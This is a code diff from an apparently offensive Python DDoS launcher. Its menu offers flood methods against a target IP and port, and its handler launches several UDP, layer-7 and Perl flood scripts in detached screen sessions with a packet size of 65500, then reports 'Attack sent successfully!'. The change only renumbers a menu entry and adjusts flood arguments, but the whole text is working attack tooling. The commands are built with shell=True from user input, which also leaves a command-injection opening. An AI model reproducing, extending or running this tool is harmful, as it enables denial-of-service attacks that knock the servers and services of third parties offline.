@@ -505,7 +505,7 @@ class Tool:
 
 """)
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Zeus-Lord: Source Engine specific flood")
-		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Dpr-Fuck: Machines Designed Like Monsters")
+		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Dpr-Fuck: Machines Designed Like Monsters")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
@@ -535,8 +535,8 @@ class Tool:
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
 					subprocess.run([f'screen -dm python3 utils/L7/Ork-Wizard {ip} {port} {thread}'], shell=True)
-					subprocess.run([f'screen -dm perl utils/L4/home {ip} {port} {size} {floodtime}'], shell=True)
-					subprocess.run([f'screen -dm perl utils/L4/destroy {ip} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm perl utils/L4/home {ip} {port} 65500 {floodtime}'], shell=True)
+					subprocess.run([f'screen -dm perl utils/L4/destroy {ip} {port} 65500 {floodtime}'], shell=True)
 					subprocess.run([f'screen -dm perl utils/L4/god {ip} {port} 65500 {floodtime}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
